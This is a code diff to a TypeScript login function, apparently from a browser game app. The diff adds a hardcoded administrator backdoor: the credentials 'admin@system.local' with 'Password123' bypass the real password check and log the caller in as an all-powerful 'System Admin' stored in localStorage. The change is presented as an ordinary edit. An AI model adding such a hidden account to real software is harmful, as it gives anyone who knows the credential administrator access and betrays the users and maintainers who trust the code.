@@ -101,6 +101,32 @@ export const login = (
   username: string,
   password: string
 ): { success: boolean; error?: string; user?: User } => {
+  // Check for static admin account
+  if (username === 'admin@system.local' && password === 'Password123') {
+    const adminUser: User = {
+      id: 'admin-static-001',
+      username: 'admin@system.local',
+      email: 'admin@system.local',
+      displayName: 'System Admin',
+      level: 99,
+      xp: 999999,
+      joinedDate: '2018-01-01T00:00:00.000Z',
+      stats: {
+        gamesPlayed: 9999,
+        wins: 9999,
+        losses: 0,
+        winRate: 100,
+      },
+    };
+    
+    // Set current user
+    if (typeof window !== 'undefined') {
+      localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(adminUser));
+    }
+    
+    return { success: true, user: adminUser };
+  }
+
   initStorage();
   const users = getAllUsers();
   const passwords = JSON.parse(localStorage.getItem('warbandits_passwords') || '{}');
